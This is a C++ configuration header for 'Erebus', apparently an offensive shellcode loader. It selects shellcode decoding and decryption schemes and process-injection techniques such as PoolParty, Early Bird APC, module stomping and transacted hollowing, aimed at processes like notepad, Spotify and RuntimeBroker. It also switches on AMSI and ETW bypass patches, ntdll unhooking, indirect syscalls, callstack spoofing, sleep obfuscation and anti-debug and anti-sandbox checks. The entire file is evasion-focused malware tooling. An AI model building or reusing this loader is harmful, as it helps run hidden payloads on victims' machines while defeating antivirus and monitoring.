#ifndef EREBUS_CONFIG
#define EREBUS_CONFIG
#pragma once

// ============================================
// COMPRESSION CONFIGURATION
// ============================================

// Compression method used for shellcode:
// 0 = NONE        - No decompression
// 1 = LZNT1       - LZNT1 compression
// 2 = RLE         - Run-Length Encoding
#define CONFIG_COMPRESSION_TYPE 0
#if CONFIG_COMPRESSION_TYPE == 1
#define DecompressShellcode erebus::DecompressionLZNT
#elif CONFIG_COMPRESSION_TYPE == 2
#define DecompressShellcode erebus::DecompressionRLE
#endif

// ============================================
// ENCODING CONFIGURATION
// ============================================

// Encoding method used for shellcode:
// 0 = NONE        - No decoding
// 1 = BASE64      - Base64 encoding
// 2 = ASCII85     - ASCII85 encoding
// 3 = ALPHA32     - ALPHA32 encoding
// 4 = WORDS256    - WORDS256 encoding
#define CONFIG_ENCODING_TYPE 0
#if CONFIG_ENCODING_TYPE == 1
#define DecodeShellcode erebus::DecodeBase64
#elif CONFIG_ENCODING_TYPE == 2
#define DecodeShellcode erebus::DecodeASCII85
#elif CONFIG_ENCODING_TYPE == 3
#define DecodeShellcode erebus::DecodeALPHA32
#elif CONFIG_ENCODING_TYPE == 4
#define DecodeShellcode erebus::DecodeWORDS256
#endif

// ============================================
// ENCRYPTION CONFIGURATION
// ============================================

// Encryption method used for shellcode:
// 0 = NONE        - No decryption
// 1 = XOR         - Simple XOR cipher
// 2 = RC4         - RC4 stream cipher
// 3 = AES_ECB     - AES in ECB mode
// 4 = AES_CBC     - AES in CBC mode
#ifndef CONFIG_ENCRYPTION_TYPE
#define CONFIG_ENCRYPTION_TYPE 0
#endif

#ifndef CONFIG_ENCRYPTION_KEY
#define CONFIG_ENCRYPTION_KEY { 0x00 }
#endif

#ifndef CONFIG_ENCRYPTION_IV
#define CONFIG_ENCRYPTION_IV { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }
#endif

// ============================================
// INJECTION CONFIGURATION
// ============================================

// Target process for remote injection (defined per injection type below)

// Injection technique:
// 1 = NtMapViewOfSection  - Section mapping injection (Remote)
// 2 = CreateFiber         - Fiber-based execution (Self) - requires shellcode ABI compliance
// 3 = EarlyCascade        - Early Bird APC injection via NtQueueApcThread (Remote)
// 4 = PoolParty           - Worker Factory thread pool injection (Remote)
// 5 = NtQueueApcThread    - Vanilla NtQueueApcThread Early Bird with jittered post-APC delay (Remote)
// 6 = ModuleStomp          - Map legitimate DLL, overwrite .text; VAD shows file-backed (Self)
// 7 = KernelCallbackTable  - Overwrite PEB KCT entry, trigger via SendMessage (Self)
// 8 = TxfHollow            - Transacted NTFS ghost section; VAD shows phantom file path (Remote)
#ifndef CONFIG_INJECTION_TYPE
#define CONFIG_INJECTION_TYPE 4
#endif

#if CONFIG_INJECTION_TYPE == 1 || CONFIG_INJECTION_TYPE == 3 || CONFIG_INJECTION_TYPE == 5
#ifndef CONFIG_TARGET_PROCESS
#define CONFIG_TARGET_PROCESS L"C:\\Windows\\System32\\notepad.exe"
#endif
#define CONFIG_INJECTION_MODE 1  // Remote injection (Create Suspended)
#elif CONFIG_INJECTION_TYPE == 2
#define CONFIG_INJECTION_MODE 2  // Self injection
#elif CONFIG_INJECTION_TYPE == 6
#define CONFIG_INJECTION_MODE 2  // Self injection
#elif CONFIG_INJECTION_TYPE == 7
#define CONFIG_INJECTION_MODE 2  // Self injection
#elif CONFIG_INJECTION_TYPE == 8
#ifndef CONFIG_TARGET_PROCESS
#define CONFIG_TARGET_PROCESS L"C:\\Windows\\System32\\calc.exe"
#endif
#define CONFIG_INJECTION_MODE 1  // Remote injection (Create Suspended)
#elif CONFIG_INJECTION_TYPE == 4
#ifndef CONFIG_TARGET_PROCESS
#define CONFIG_TARGET_PROCESS \
            erebus::HashStringFowlerNollVoVariant1a("RuntimeBroker.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("fontdrvhost.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("dllhost.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("Spotify.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("slack.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("PerfWatson2.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("SteelSeriesGG.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("GoogleDriveFS.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("steamwebhelper.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("slpwow64.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("sihost.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("msiexec.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("WerFault.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("werfault.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("devenv.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("cloudflared.exe"), \
            erebus::HashStringFowlerNollVoVariant1a("mrt.exe")
#endif
#define CONFIG_INJECTION_MODE 3  // Remote injection (Inject into existing process)
#endif

#if CONFIG_INJECTION_TYPE == 1
#define ExecuteShellcode erebus::InjectionNtMapViewOfSection
#elif CONFIG_INJECTION_TYPE == 2
#define ExecuteShellcode erebus::InjectionCreateFiber
#elif CONFIG_INJECTION_TYPE == 3
#define ExecuteShellcode erebus::InjectionEarlyCascade
#elif CONFIG_INJECTION_TYPE == 4
#define ExecuteShellcode erebus::InjectionPoolParty
#elif CONFIG_INJECTION_TYPE == 5
#define ExecuteShellcode erebus::InjectionNtQueueApcThread
#elif CONFIG_INJECTION_TYPE == 6
#define ExecuteShellcode erebus::InjectionModuleStomp
#elif CONFIG_INJECTION_TYPE == 7
#define ExecuteShellcode erebus::InjectionKernelCallback
#elif CONFIG_INJECTION_TYPE == 8
#define ExecuteShellcode erebus::InjectionTxfHollow
#endif

// ============================================
// GUARDRAILS CONFIGURATION
// ============================================

#include "guardrails/guardrails.hpp"

// Enable/disable guardrails checks at compile time
#ifndef CONFIG_GUARDRAILS_ENABLED
#define CONFIG_GUARDRAILS_ENABLED 0
#endif

#ifndef CONFIG_GUARDRAILS_CHECK_DEBUGGER
#define CONFIG_GUARDRAILS_CHECK_DEBUGGER 0
#endif

#ifndef CONFIG_GUARDRAILS_CHECK_REMOTE_DEBUGGER
#define CONFIG_GUARDRAILS_CHECK_REMOTE_DEBUGGER 0
#endif

#ifndef CONFIG_GUARDRAILS_CHECK_DEBUGGER_PROCESSES
#define CONFIG_GUARDRAILS_CHECK_DEBUGGER_PROCESSES 0
#endif

#ifndef CONFIG_GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS
#define CONFIG_GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS 0
#endif

#ifndef CONFIG_GUARDRAILS_CHECK_TIMING
#define CONFIG_GUARDRAILS_CHECK_TIMING 0
#endif

#ifndef CONFIG_GUARDRAILS_CHECK_SANDBOX
#define CONFIG_GUARDRAILS_CHECK_SANDBOX 0
#endif

// Decoy file to open when guardrails fail (empty = silent exit)
#ifndef CONFIG_GUARDRAILS_DECOY_FILE
#define CONFIG_GUARDRAILS_DECOY_FILE ""
#endif

// ============================================
// SYSCALL BACKEND CONFIGURATION
// ============================================

// 0 = TartarusGate  (built-in indirect syscall shim page, default)
// 1 = SysWhispers3  (generated stubs; requires include/evasion/sw3/ files)
#ifndef CONFIG_SYSCALL_BACKEND
#define CONFIG_SYSCALL_BACKEND 0
#endif

// ============================================
// CALLSTACK SPOOFING CONFIGURATION
// ============================================

// 0 = disabled
// 1 = enabled - InitCallstackSpoof() runs in RunEvasionPatches(), locating
//     `add rsp, 0x68; ret` inside the module list below. Use GetSpoofGadget()
//     to fill SpoofContext::Gadget, then call SpoofCall() at injection sites.
#ifndef CONFIG_CALLSTACK_SPOOF_ENABLED
#define CONFIG_CALLSTACK_SPOOF_ENABLED 0
#endif

// Gadget host modules, searched in order. Overridden by the builder via
// the config.hpp Jinja render; this fallback mirrors the historical
// ntdll/kernel32/kernelbase default for standalone builds that bypass the
// template. Displacement is fixed at 0x68 (see callstack_spoof_gas.S).
#ifndef CONFIG_CALLSTACK_SPOOF_MODULE_COUNT
#define CONFIG_CALLSTACK_SPOOF_MODULE_COUNT 3
#endif
#ifndef CONFIG_CALLSTACK_SPOOF_MODULES
#define CONFIG_CALLSTACK_SPOOF_MODULES \
            erebus::HashStringFowlerNollVoVariant1a("ntdll.dll"), \
            erebus::HashStringFowlerNollVoVariant1a("kernel32.dll"), \
            erebus::HashStringFowlerNollVoVariant1a("kernelbase.dll")
#endif

// ============================================
// SLEEP OBFUSCATION CONFIGURATION
// ============================================

// Pre-injection dwell mode:
// 0 = None       - no dwell (default; loader executes immediately)
// 1 = Timer      - WaitableTimer jittered dwell (anti-sandbox timing bypass)
// 2 = Ekko-lite  - Timer + XOR non-.text PE sections during wait
//                  (hides shellcode/config from memory scanners during sleep)
//
// Mode 1 and 2 are effective against sandboxes that accelerate Sleep() /
// NtDelayExecution() - WaitableTimer fires at real wall-clock time.
// Mode 2 additionally encrypts .rdata (where the shellcode blob lives)
// during the wait window, defeating signature-based memory scanners.
#ifndef CONFIG_SLEEP_OBFUSCATION_TYPE
#define CONFIG_SLEEP_OBFUSCATION_TYPE 0
#endif

// Base dwell in milliseconds before injection begins.
// Actual dwell = CONFIG_SLEEP_OBFUSCATION_BASE_MS
//              + random(0, CONFIG_SLEEP_OBFUSCATION_JITTER_MS)
#ifndef CONFIG_SLEEP_OBFUSCATION_BASE_MS
#define CONFIG_SLEEP_OBFUSCATION_BASE_MS 5000
#endif

// Maximum random milliseconds added to the base dwell for jitter.
// Set to 0 to disable jitter (fixed dwell = base_ms only).
#ifndef CONFIG_SLEEP_OBFUSCATION_JITTER_MS
#define CONFIG_SLEEP_OBFUSCATION_JITTER_MS 3000
#endif

// ============================================
// AMSI BYPASS CONFIGURATION
// ============================================

// AMSI bypass type:
// 0 = None
// 1 = PatchAmsiScanBuffer (existing PatchAmsi())
// 2 = PatchAmsiScanBuffer + PatchAmsiOpenSession
// 3 = All + InvalidateAmsiContext
// 4 = Patchless (Dr0 HW-BP + VEH at AmsiScanBuffer, no byte patches)
#ifndef CONFIG_AMSI_BYPASS_TYPE
#define CONFIG_AMSI_BYPASS_TYPE 1
#endif

// ============================================
// ETW BYPASS CONFIGURATION
// ============================================

// ETW bypass type:
// 0 = None
// 1 = PatchEtwEventWrite (existing PatchEtw())
// 2 = PatchEtwEventWrite + PatchEtwEventWriteFull
// 3 = All + UnregisterEtwProviders
#ifndef CONFIG_ETW_BYPASS_TYPE
#define CONFIG_ETW_BYPASS_TYPE 1
#endif

// ============================================
// UNHOOK SCOPE CONFIGURATION
// ============================================

// Unhook scope:
// 0 = ntdll only (existing UnhookNtdll())
// 1 = ntdll + kernel32 + kernelbase
// 2 = selective (list of hashed function names)
#ifndef CONFIG_UNHOOK_SCOPE
#define CONFIG_UNHOOK_SCOPE 0
#endif

// ============================================
// PATCH XOR KEY CONFIGURATION
// ============================================

// XOR key for obfuscating patch byte arrays (single byte).
// Applied at compile time when encoding the static kEncoded[] arrays;
// decoded inline at runtime before the bytes are written to memory.
#ifndef CONFIG_PATCH_XOR_KEY
#define CONFIG_PATCH_XOR_KEY 0xAB
#endif

// ============================================
// GUARDRAILS HELPER
// ============================================

// Helper function to get configured guardrails
inline erebus::guardrails::GuardrailConfig GetGuardrailConfig() {
    erebus::guardrails::GuardrailConfig config = erebus::guardrails::GetDefaultConfig();
    
    #if CONFIG_GUARDRAILS_ENABLED
        config.check_debugger_present = CONFIG_GUARDRAILS_CHECK_DEBUGGER;
        config.check_remote_debugger = CONFIG_GUARDRAILS_CHECK_REMOTE_DEBUGGER;
        config.check_debugger_processes = CONFIG_GUARDRAILS_CHECK_DEBUGGER_PROCESSES;
        config.check_hardware_breakpoints = CONFIG_GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS;
        config.check_timing_checks = CONFIG_GUARDRAILS_CHECK_TIMING;
        config.check_sandbox_environment = CONFIG_GUARDRAILS_CHECK_SANDBOX;
    #endif
    
    return config;
}

#endif
